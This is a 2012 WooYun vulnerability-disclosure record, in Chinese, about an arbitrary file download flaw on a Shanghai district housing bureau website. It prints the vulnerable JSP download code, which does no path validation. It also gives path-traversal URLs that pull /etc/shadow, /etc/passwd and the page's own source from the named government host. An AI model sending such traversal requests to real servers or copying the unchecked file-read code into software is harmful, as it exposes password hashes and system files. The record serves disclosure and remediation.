{"id": 17284, "wybug_id": "wooyun-2012-010945", "wybug_title": "上海市徐汇区住房保障和房屋管理局任意文件下载", "wybug_corp": "上海市徐汇区住房保障和房屋管理局", "wybug_author": "Tea", "wybug_date": "2012-08-16 11:24", "wybug_open_date": "2012-09-30 11:24", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-30：\t细节向公众公开  简要描述： 任意文件下载权限大到可以下载影子文件 详细说明：  任意文件下载权限大到可以下载影子文件   漏洞证明：  下载系统文件\n<%   String realPath = request.getSession().        getServletContext().getRealPath(\"/\");    String fileUrl = new String(request.getParameter(\"file\").getBytes(\"ISO-8859-1\"),\"gbk\");    File file = new File(fileUrl);    FileInputStream bis = new FileInputStream(realPath + \"/xml/information/\" + file);    String name = file.getName();    response.setCharacterEncoding(\"gbk\");    response.setContentType(\"application/x-msdownload\");    //String download = “this is only a test string.“;response.setHeader(        \"Content-disposition\",        \"attachment;filename=\"+toUtf8String(name));    OutputStream bos = response.getOutputStream();    byte[] buff = new byte[1024];            int readCount = 0;            int i = 0;            readCount = bis.read(buff);            while (readCount != -1){               bos.write(buff, 0, readCount);               readCount = bis.read(buff);            }            if (bis!=null)                bis.close();            if (bos!=null)                bos.close();%>\nhttp://fangguan.xuhui.gov.cn/download.jsp?file=/../../../../../etc/shadowhttp://fangguan.xuhui.gov.cn/download.jsp?file=/../../../../../etc/passwd\n\n下载WEBhttp://fangguan.xuhui.gov.cn/download.jsp?file=../../download.jsp\n\n   修复方案：  对下载路径做必要的限制！   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-08-20 22:58 厂商回复： CNVD确认漏洞并复现所述情况，转由CNCERT上海分中心协调涉事单位处置。按部分影响机密性、完整性进行评分，rank=6.42*1.0*1.2=7.704 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}